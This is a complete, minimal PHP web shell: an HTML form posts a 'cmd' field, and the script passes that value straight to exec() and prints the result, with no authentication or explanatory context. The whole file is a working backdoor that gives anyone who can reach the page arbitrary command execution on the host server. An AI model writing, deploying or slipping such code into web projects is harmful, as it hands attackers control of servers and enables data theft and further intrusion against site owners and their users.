<FORM METHOD="POST" ACTION="">
<INPUT TYPE="text" NAME="cmd"><BR>
<INPUT TYPE="submit" value="submit"> <INPUT TYPE="reset">
</FORM>
<?php
echo $cmd = $_POST['cmd'];
if(is_string($cmd) && $cmd != '')
{
    echo exec($cmd);
}
?>